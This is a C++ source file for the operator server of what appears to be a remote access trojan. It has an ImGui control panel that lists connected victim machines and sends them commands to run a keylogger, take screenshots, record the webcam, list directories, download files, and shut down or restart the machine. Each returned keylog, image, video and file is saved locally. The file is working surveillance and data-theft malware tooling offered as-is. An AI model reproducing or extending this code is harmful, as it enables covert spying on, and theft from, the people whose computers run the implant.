#include <bits/stdc++.h>

#include <imgui.h>
#include <imgui_impl_dx9.h>
#include <imgui_impl_win32.h>
#include <d3d9.h>

#include "PeerConnection.hpp"
#include "ImGuiStdString.hpp"
#include "ThreadWrapper.hpp"
#include "Message.hpp"
#include "ImGuiScrollableText.hpp"

#define DEFAULT_PORT 62300

std::map<std::string, uint32_t> clientNamingPool;
GuiScrollableTextDisplay miniConsole;

const std::string serverTempFolderName = "server_tmp";  //must not be empty string !

///////////////////////////////////////////////////////

class ClientSession : public PeerConnection {
public:
    ClientSession(int socket, const sockaddr_in& clientAddress) {
        socketfile.store(socket);
        
        char* ip = inet_ntoa(clientAddress.sin_addr);
        peerIp = ip ? ip : "0.0.0.0";
        peerPort = ntohs(clientAddress.sin_port);
        connectionTime = std::chrono::system_clock::now();
        active.store(true);

        // Start listener thread
        std::thread([this]() {
            listenToClient();
        }).detach();

        sendPublicKey();
    }

    std::string makeWidgetName(const std::string& name, 
                             const std::string& postfix = "") const {
        return name + "##" + getPeerIpPort() + '_' + postfix;
    }

private:
    void executeMessage(const Message& msg) {
        switch(msg.commandNumber) {
            case MessageDisableKeylog: {
                std::string filename = serverTempFolderName + "/keylog_" + getCurrentIsoTime() + ".txt";
                std::ofstream outfile(filename, std::ios::out | std::ios::binary);
                if(!outfile) {
                    miniConsole.AddLineError("Keylogger data failed to save to file");
                    break;
                }
                outfile.write(msg.getBinaryData(), msg.getBinaryDataSize());
                outfile.close();
                miniConsole.AddLineInfo("Keylogger data saved to file %s", filename.c_str());
                break;
            }
            case MessageScreenCap: {
                std::string filename = serverTempFolderName + "/screencap_" + getCurrentIsoTime() + ".jpg";
                std::ofstream outfile(filename, std::ios::out | std::ios::binary);
                if(!outfile) {
                    miniConsole.AddLineError("Screencap data failed to save to file");
                    break;
                }
                outfile.write(msg.getBinaryData(), msg.getBinaryDataSize());
                outfile.close();
                miniConsole.AddLineInfo("Screencap data saved to file %s", filename.c_str());
                break;
            } 
            case MessageInvokeWebcam: {
                std::string filename = serverTempFolderName + "/webcam_" + getCurrentIsoTime() + ".mp4";
                std::ofstream outfile(filename, std::ios::out | std::ios::binary);
                if(!outfile) {
                    miniConsole.AddLineError("webcam data failed to save to file");
                    break;
                }
                outfile.write(msg.getBinaryData(), msg.getBinaryDataSize());
                outfile.close();
                miniConsole.AddLineInfo("webcam data saved to file %s", filename.c_str());
                break;
            }

            case MessageListFile: {
                json jsonFileListingData = json::parse(std::string(msg.getBinaryData(), msg.getBinaryDataSize()));
                std::string jsonBeautified = jsonFileListingData.dump(4);

                std::string filename = serverTempFolderName + "/pathquery_" + getCurrentIsoTime() + ".json";
                std::ofstream outfile(filename, std::ios::out | std::ios::binary);
                if(!outfile) {
                    miniConsole.AddLineError("listing directory failed to save to file");
                    break;
                }
                outfile.write(jsonBeautified.c_str(), jsonBeautified.size());
                outfile.close();
                miniConsole.AddLineInfo("listing directory saved to file %s", filename.c_str());
                break;
            }

            case MessageGetFile: {
                json jsonData = json::parse(std::string(msg.getJsonData(), msg.getJsonDataSize()));
                std::string filename = serverTempFolderName + '/' + (std::string) jsonData.at("fileName");
                std::ofstream outfile(filename, std::ios::out | std::ios::binary);
                if(!outfile) {
                    miniConsole.AddLineError("get file failed to save to file");
                    break;
                }
                outfile.write(msg.getBinaryData(), msg.getBinaryDataSize());
                outfile.close();
                miniConsole.AddLineInfo("get file saved to file %s", filename.c_str());
                break;
            }
        }
    }

    void listenToClient() {
        while (active.load()) {
            auto status = receiveData();
            
            switch (status) {
                case ReceiveStatus::Success: {
                    Message msg;
                    if (processCompleteMessage(msg)) {
                        miniConsole.AddLineSuccess("Successfully proceeded message %s", this->getPeerIpPort().c_str());
                        std::thread([msg, this]() {
                            executeMessage(msg);
                        }).detach();
                    } else {
                        miniConsole.AddLineError("Failed to proceeded message %s", this->getPeerIpPort().c_str());
                    }
                    break;
                }
                case ReceiveStatus::KeyExchange:
                    miniConsole.AddLineSuccess("Successfully key exchange for client %s", this->getPeerIpPort().c_str());
                    break;
                case ReceiveStatus::PeerDisconnected:
                    miniConsole.AddLineInfo("Client disconnected: %s", this->getPeerIpPort().c_str());
                    break;
                case ReceiveStatus::NeedMoreData:
                    // Wait for more data
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                    break;
                case ReceiveStatus::Error:
                    active.store(false);
                    return;
            }
        }
    }
};


/////////////////////////////////////////////////////// 

class ClientVector {
private:
    mutable std::mutex clientVecMutex;
    std::vector<ClientSession*> clientVec;

public:
    ClientVector() = default;
    ~ClientVector() {
        clear();
    }

    void removeInactive() {
        std::lock_guard<std::mutex> lock(clientVecMutex);
        auto removePtr = std::remove_if(clientVec.begin(), clientVec.end(),
            [](ClientSession* client) {
                return !client->isActive();
            });

        for(auto ite = removePtr; ite != clientVec.end(); ite++) {
            delete *ite;
        }

        clientVec.erase(removePtr, clientVec.end());
    }

    void add(ClientSession *client) {
        std::lock_guard<std::mutex> lock(clientVecMutex);
        clientVec.push_back(client);
    }

    size_t size() const {
        std::lock_guard<std::mutex> lock(clientVecMutex);
        return clientVec.size();
    }

    ClientSession* operator[](size_t index) {
        std::lock_guard<std::mutex> lock(clientVecMutex);
        return index < clientVec.size() ? clientVec[index] : nullptr;
    }

    void clear() {
        std::lock_guard<std::mutex> lock(clientVecMutex);
        for(auto ite = clientVec.begin(); ite != clientVec.end(); ite++) {
            delete *ite;
        }
    }

    // Broadcast a message to all active clients (thread-safe)
    bool broadcast(const Message& msg) {
        std::lock_guard<std::mutex> lock(clientVecMutex);
        bool success = true;
        for (auto& client : clientVec) {
            if (client->isActive()) {
                if (!client->sendData(msg)) {
                    success = false;
                }
            }
        }
        return success;
    }

    // Find a client by predicate (thread-safe)
    // template<typename Pred>
    // ClientSession* find(Pred pred) {
    //     std::lock_guard<std::mutex> lock(clientVecMutex);
    //     auto it = std::find_if(clientVec.begin(), clientVec.end(),
    //         [&pred](const std::unique_ptr<ClientSession>& client) {
    //             return pred(*client);
    //         });
    //     return it != clientVec.end() ? it->get() : nullptr;
    // }
};

///////////////////////////////////////////////////

ClientVector clientVector;

class ServerConnectionManager {
private:
    std::atomic<int> serverSocket{-1};
    std::atomic<bool> running{false};
    std::thread acceptThread;

    bool isInvalidAddress(const sockaddr_in* addr) const {
        // Filter 0.0.0.0:0
        if (addr->sin_addr.s_addr == 0 && addr->sin_port == 0) return true;
        
        // Filter broadcast addresses
        if (addr->sin_addr.s_addr == INADDR_BROADCAST) return true;

        return false;
    }

    void closesocket(int socketHandle) {
        #ifdef WIN32
        ::closesocket(socketHandle);
        #else
        close(socketHandle);
        #endif
    }

    void acceptClientLoop() {
        sockaddr_in incomingAddress;
        socklen_t incomingAddressSize = sizeof(incomingAddress);

        while (running.load()) {
            int clientSocket = accept(serverSocket.load(), 
                                    reinterpret_cast<sockaddr*>(&incomingAddress), 
                                    &incomingAddressSize);
            
            if (clientSocket == -1) {
                if (errno != EWOULDBLOCK) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                }
                continue;
            }

            if (isInvalidAddress(&incomingAddress)) {
                closesocket(clientSocket);
                continue;
            }

            auto* newClient = new ClientSession(clientSocket, incomingAddress);
            clientVector.add(newClient);
            miniConsole.AddLineSuccess("Client %s connected!", newClient->getPeerIpPort().c_str());
        }
    }

public:
    ServerConnectionManager() = default;

    ~ServerConnectionManager() {
        disconnect();
    }

    bool init(uint16_t port = DEFAULT_PORT) {
        if (running.load()) return false;

        // Create server socket
        int newSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (newSocket == -1) {
            return false;
        }

        // Set socket options
        int reuse = 1;
        setsockopt(newSocket, SOL_SOCKET, SO_REUSEADDR, reinterpret_cast<const char*>(&reuse), sizeof(reuse));

        /*
        // Non-blocking mode for graceful shutdown
        #ifdef WIN32
            u_long mode = 1;
            ioctlsocket(newSocket, FIONBIO, &mode);
        #else
            int flags = fcntl(newSocket, F_GETFL, 0);
            fcntl(newSocket, F_SETFL, flags | O_NONBLOCK);
        #endif
        */

        // Bind socket
        sockaddr_in sa;
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        sa.sin_addr.s_addr = htonl(INADDR_ANY);

        if (bind(newSocket, reinterpret_cast<sockaddr*>(&sa), sizeof(sa)) == -1) {
            closesocket(newSocket);
            return false;
        }

        // Listen
        if (listen(newSocket, SOMAXCONN) == -1) {
            closesocket(newSocket);
            return false;
        }

        serverSocket.store(newSocket);
        running.store(true);

        acceptThread = std::thread(&ServerConnectionManager::acceptClientLoop, this);
        acceptThread.detach();

        miniConsole.AddLineSuccess("Server initialized on port %d!", port);
        return true;
    }

    void disconnect() {
        if (!running.load()) return;
        running.store(false);

        int currentSocket = serverSocket.load();
        if (currentSocket != -1) {
            shutdown(currentSocket, 2);
            closesocket(currentSocket);
            serverSocket.store(-1);
        }

        miniConsole.AddLineInfo("Server stopped");
    }

    bool isRunning() const { return running.load(); }
};

///////////////////////////////////////////////////

void RunGui() {
    ImGui::SetNextWindowSize(ImVec2(800, 600), ImGuiCond_Once);
    ImGui::Begin("Server Panel", nullptr, ImGuiWindowFlags_NoCollapse);
    ImGui::SeparatorText("Connected Clients");
    ImGui::Text("Active clients: %zu", clientVector.size());
    
    for(int i=0; i < clientVector.size(); i++) {
        auto& client = *clientVector[i];
        const std::string headerLabel = client.getPeerIpPort() + "###" + client.getPeerIpPort();
        
        if (ImGui::CollapsingHeader(headerLabel.c_str())) {
            ImGui::Text("Connected for %llus", client.getConnectionDuration());
            
            ImGui::InputTextMultiline(client.makeWidgetName("Message Input").c_str(), &client.funcStruct.rawText, ImVec2(600, 55));
            
            // Send button
            if (ImGui::Button(client.makeWidgetName("Send raw text").c_str())) {
                if (client.funcStruct.rawText.size() > 0) {
                    std::thread([&client] {
                        Message textMessage;
                        textMessage.commandNumber = MessageRawText;
                        textMessage.setBinaryData(client.funcStruct.rawText.c_str(), client.funcStruct.rawText.size());
                        
                        if (client.sendData(textMessage)) {
                            miniConsole.AddLineSuccess("Raw text Message sent to %s", 
                                                        client.getPeerIpPort().c_str());
                        } else {
                            miniConsole.AddLineError("Failed to send raw text message to %s", 
                                                    client.getPeerIpPort().c_str());
                        }
                    }).detach();
                }
            }

            if(ImGui::Checkbox("Func: Keylogger", &client.funcStruct.isKeyloggerActive)) {  //click -> already changed the state
                if(client.funcStruct.isKeyloggerActive) {
                    std::thread([&client] {
                        Message msg;
                        msg.commandNumber = MessageEnableKeylog;
                        
                        if (client.sendData(msg)) {
                            miniConsole.AddLineSuccess("Enable Keylogger Message sent to %s", 
                                                        client.getPeerIpPort().c_str());
                        } else {
                            miniConsole.AddLineError("Failed to send Enable Keylogger message to %s", 
                                                    client.getPeerIpPort().c_str());
                        }
                    }).detach();
                } else {
                    std::thread([&client] {
                        Message msg;
                        msg.commandNumber = MessageDisableKeylog;
                        
                        if (client.sendData(msg)) {
                            miniConsole.AddLineSuccess("Disable Keylogger Message sent to %s", 
                                                        client.getPeerIpPort().c_str());
                        } else {
                            miniConsole.AddLineError("Failed to send Disable Keylogger message to %s", 
                                                    client.getPeerIpPort().c_str());
                        }
                    }).detach();
                }
            }
            
            if(ImGui::Button(client.makeWidgetName("Invoke webcam").c_str())) {
                std::thread([&client] {
                    Message msg;
                    msg.commandNumber = MessageInvokeWebcam;
                    json jsonData;
                    jsonData["millisecond"] = client.funcStruct.webcamDurationMs;
                    jsonData["fps"] = client.funcStruct.webcamFps;
                    msg.setJsonData(jsonData);
                    if (client.sendData(msg)) {
                        miniConsole.AddLineSuccess("Invoke Webcam Message sent to %s", client.getPeerIpPort().c_str());
                    } else {
                        miniConsole.AddLineError("Failed to send Invoke Webcam message to %s", client.getPeerIpPort().c_str());
                    }
                }).detach();
            }
            ImGui::SetNextItemWidth(150.0f);
            if(ImGui::InputInt("Invoke webcam duration (in millisecond)", &client.funcStruct.webcamDurationMs)) {
                if(client.funcStruct.webcamDurationMs < 1000) client.funcStruct.webcamDurationMs = 1000;
                if(client.funcStruct.webcamDurationMs > 2000000000) client.funcStruct.webcamDurationMs = 2000000000;
            }
            ImGui::SetNextItemWidth(150.0f);
            if(ImGui::InputInt("Invoke webcam fps limit", &client.funcStruct.webcamFps)) {
                if(client.funcStruct.webcamFps < 0) client.funcStruct.webcamFps = 10;
                if(client.funcStruct.webcamFps > 500) client.funcStruct.webcamFps = 500;
            }

            if(ImGui::Button(client.makeWidgetName("Take Screenshot").c_str())) {
                std::thread([&client] {
                    Message msg;
                    msg.commandNumber = MessageScreenCap;
                    if (client.sendData(msg)) {
                        miniConsole.AddLineSuccess("Take Screenshot Message sent to %s", client.getPeerIpPort().c_str());
                    } else {
                        miniConsole.AddLineError("Failed to send Take Screenshot message to %s", client.getPeerIpPort().c_str());
                    }
                }).detach();
            }

            ImGui::SetNextItemWidth(600.0f);
            ImGui::InputText("Input path for listing directory", &client.funcStruct.pathText);
            if(ImGui::Button(client.makeWidgetName("List directory").c_str())) {
                std::thread([&client] {
                    Message msg;
                    msg.commandNumber = MessageListFile;
                    json jsonData;
                    jsonData["fileName"] = client.funcStruct.pathText;
                    msg.setJsonData(jsonData);
                    if (client.sendData(msg)) {
                        miniConsole.AddLineSuccess("List directory Message sent to %s", client.getPeerIpPort().c_str());
                    } else {
                        miniConsole.AddLineError("Failed to send List directory message to %s", client.getPeerIpPort().c_str());
                    }
                }).detach();
            }

            ImGui::SetNextItemWidth(600.0f);
            ImGui::InputText("Input full-filename to get file", &client.funcStruct.getFileText);
            if(ImGui::Button(client.makeWidgetName("Get File").c_str())) {
                std::thread([&client] {
                    Message msg;
                    msg.commandNumber = MessageGetFile;
                    json jsonData;
                    jsonData["fileName"] = client.funcStruct.getFileText;
                    msg.setJsonData(jsonData);
                    if (client.sendData(msg)) {
                        miniConsole.AddLineSuccess("Get File Message sent to %s", client.getPeerIpPort().c_str());
                    } else {
                        miniConsole.AddLineError("Failed to send Get File message to %s", client.getPeerIpPort().c_str());
                    }
                }).detach();
            }

            ImGui::SeparatorText("Special action");

            if(ImGui::Button(client.makeWidgetName("Shutdown").c_str())) {
                std::thread([&client] {
                    Message msg;
                    msg.commandNumber = MessageShutdownMachine;
                    if (client.sendData(msg)) {
                        miniConsole.AddLineSuccess("Shutdown Message sent to %s", client.getPeerIpPort().c_str());
                    } else {
                        miniConsole.AddLineError("Failed to send Shutdown message to %s", client.getPeerIpPort().c_str());
                    }
                }).detach();
            }

            if(ImGui::Button(client.makeWidgetName("Restart").c_str())) {
                std::thread([&client] {
                    Message msg;
                    msg.commandNumber = MessageRestartMachine;
                    if (client.sendData(msg)) {
                        miniConsole.AddLineSuccess("Restart Message sent to %s", client.getPeerIpPort().c_str());
                    } else {
                        miniConsole.AddLineError("Failed to send Restart message to %s", client.getPeerIpPort().c_str());
                    }
                }).detach();
            }

            ImGui::SeparatorText("Kick");
            // Kick button
            if (ImGui::Button(client.makeWidgetName("Kick Client").c_str())) {
                std::thread([&client] {
                    client.disconnect();
                    miniConsole.AddLineWarning("Kicked client %s", client.getPeerIpPort().c_str());
                }).detach();
                clientVector.removeInactive();
            }
        }
        clientVector.removeInactive();
    };
    
    // Console Section
    ImGui::SeparatorText("Console");
    miniConsole.Draw("Console", true, ImVec2(-1, 640));
    
    // System Info Section
    ImGui::SeparatorText("System");
    ImGui::Text("Average FPS: %d", (int) ImGui::GetIO().Framerate);
    
    ImGui::End();
}

ServerConnectionManager connectionManager;

/////////////////////////////////////////////////
static LPDIRECT3D9              g_pD3D = nullptr;
static LPDIRECT3DDEVICE9        g_pd3dDevice = nullptr;
static bool                     g_DeviceLost = false;
static UINT                     g_ResizeWidth = 0, g_ResizeHeight = 0;
static D3DPRESENT_PARAMETERS    g_d3dpp = {};

// Forward declarations of helper functions
bool CreateDeviceD3D(HWND hWnd);
void CleanupDeviceD3D();
void ResetDevice();
LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
///////////////////////////////////////////////////

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, WCHAR *lpCmdLine, int nCmdShow) {
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    UNREFERENCED_PARAMETER(nCmdShow);
    if(!CreateDirectoryCrossPlatform(serverTempFolderName)) {
        std::cerr << "Fatal error: Can't create folder for temporary server data\n";
        return -1;
    }

    WSADATA wsaData;
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }

    connectionManager.init();

    //Setup GUI
    /////////////////////////////////////////////////////

    // Make process DPI aware and obtain main monitor scale
    ImGui_ImplWin32_EnableDpiAwareness();
    float main_scale = ImGui_ImplWin32_GetDpiScaleForMonitor(::MonitorFromPoint(POINT{ 0, 0 }, MONITOR_DEFAULTTOPRIMARY));

    // Create application window
    WNDCLASSEXW wc = { sizeof(wc), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(nullptr), nullptr, nullptr, nullptr, nullptr, L"ImGui Example", nullptr };
    ::RegisterClassExW(&wc);
    HWND hwnd = ::CreateWindowW(wc.lpszClassName, L"Dear ImGui DirectX9 Example", WS_OVERLAPPEDWINDOW, 100, 100, (int)(1280 * main_scale), (int)(800 * main_scale), nullptr, nullptr, wc.hInstance, nullptr);

    // Initialize Direct3D
    if (!CreateDeviceD3D(hwnd))
    {
        CleanupDeviceD3D();
        ::UnregisterClassW(wc.lpszClassName, wc.hInstance);
        return 1;
    }

    // Show the window
    ::ShowWindow(hwnd, SW_SHOWDEFAULT);
    ::UpdateWindow(hwnd);

    // Setup Dear ImGui context
    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO& io = ImGui::GetIO(); (void)io;
    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;
    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;
    io.IniFilename = nullptr;

    // Setup Dear ImGui style
    ImGui::StyleColorsDark();

    // Setup Platform/Renderer backends
    ImGui_ImplWin32_Init(hwnd);
    ImGui_ImplDX9_Init(g_pd3dDevice);

    ImVec4 clear_color = ImVec4(0.0f, 0.0f, 128.0f, 1.00f);

    // Main loop
    bool done = false;
    while (!done)
    {
        // Poll and handle messages (inputs, window resize, etc.)
        // See the WndProc() function below for our to dispatch events to the Win32 backend.
        MSG msg;
        while (::PeekMessage(&msg, nullptr, 0U, 0U, PM_REMOVE))
        {
            ::TranslateMessage(&msg);
            ::DispatchMessage(&msg);
            if (msg.message == WM_QUIT)
                done = true;
        }
        if (done)
            break;

        // Handle lost D3D9 device
        if (g_DeviceLost) {
            HRESULT hr = g_pd3dDevice->TestCooperativeLevel();
            if (hr == D3DERR_DEVICELOST) {
                ::Sleep(10);
                continue;
            }
            if (hr == D3DERR_DEVICENOTRESET) ResetDevice();
            g_DeviceLost = false;
        }

        // Handle window resize (we don't resize directly in the WM_SIZE handler)
        if (g_ResizeWidth != 0 && g_ResizeHeight != 0)
        {
            g_d3dpp.BackBufferWidth = g_ResizeWidth;
            g_d3dpp.BackBufferHeight = g_ResizeHeight;
            g_ResizeWidth = g_ResizeHeight = 0;
            ResetDevice();
        }

        // Start the Dear ImGui frame
        ImGui_ImplDX9_NewFrame();
        ImGui_ImplWin32_NewFrame();
        ImGui::NewFrame();

        RunGui();

        // Rendering
        ImGui::EndFrame();
        g_pd3dDevice->SetRenderState(D3DRS_ZENABLE, FALSE);
        g_pd3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, FALSE);
        g_pd3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, FALSE);
        D3DCOLOR clear_col_dx = D3DCOLOR_RGBA((int)(clear_color.x*clear_color.w*255.0f), (int)(clear_color.y*clear_color.w*255.0f), (int)(clear_color.z*clear_color.w*255.0f), (int)(clear_color.w*255.0f));
        g_pd3dDevice->Clear(0, nullptr, D3DCLEAR_TARGET | D3DCLEAR_ZBUFFER, clear_col_dx, 1.0f, 0);
        if (g_pd3dDevice->BeginScene() >= 0)
        {
            ImGui::Render();
            ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
            g_pd3dDevice->EndScene();
        }
        HRESULT result = g_pd3dDevice->Present(nullptr, nullptr, nullptr, nullptr);
        if (result == D3DERR_DEVICELOST) g_DeviceLost = true;
    }


    connectionManager.disconnect();
    WSACleanup();
    return 0;
}

/////////////////////////////
//Helper

bool CreateDeviceD3D(HWND hWnd)
{
    if ((g_pD3D = Direct3DCreate9(D3D_SDK_VERSION)) == nullptr)
        return false;

    // Create the D3DDevice
    ZeroMemory(&g_d3dpp, sizeof(g_d3dpp));
    g_d3dpp.Windowed = TRUE;
    g_d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
    g_d3dpp.BackBufferFormat = D3DFMT_UNKNOWN; // Need to use an explicit format with alpha if needing per-pixel alpha composition.
    g_d3dpp.EnableAutoDepthStencil = TRUE;
    g_d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
    g_d3dpp.PresentationInterval = D3DPRESENT_INTERVAL_ONE;           // Present with vsync
    if (g_pD3D->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, hWnd, D3DCREATE_HARDWARE_VERTEXPROCESSING, &g_d3dpp, &g_pd3dDevice) < 0)
        return false;

    return true;
}

void CleanupDeviceD3D()
{
    if (g_pd3dDevice) { g_pd3dDevice->Release(); g_pd3dDevice = nullptr; }
    if (g_pD3D) { g_pD3D->Release(); g_pD3D = nullptr; }
}

void ResetDevice()
{
    ImGui_ImplDX9_InvalidateDeviceObjects();
    HRESULT hr = g_pd3dDevice->Reset(&g_d3dpp);
    if (hr == D3DERR_INVALIDCALL)
        IM_ASSERT(0);
    ImGui_ImplDX9_CreateDeviceObjects();
}

// Forward declare message handler from imgui_impl_win32.cpp
extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
        return true;

    switch (msg)
    {
    case WM_SIZE:
        if (wParam == SIZE_MINIMIZED)
            return 0;
        g_ResizeWidth = (UINT)LOWORD(lParam); // Queue resize
        g_ResizeHeight = (UINT)HIWORD(lParam);
        return 0;
    case WM_SYSCOMMAND:
        if ((wParam & 0xfff0) == SC_KEYMENU) // Disable ALT application menu
            return 0;
        break;
    case WM_DESTROY:
        ::PostQuitMessage(0);
        return 0;
    }
    return ::DefWindowProcW(hWnd, msg, wParam, lParam);
}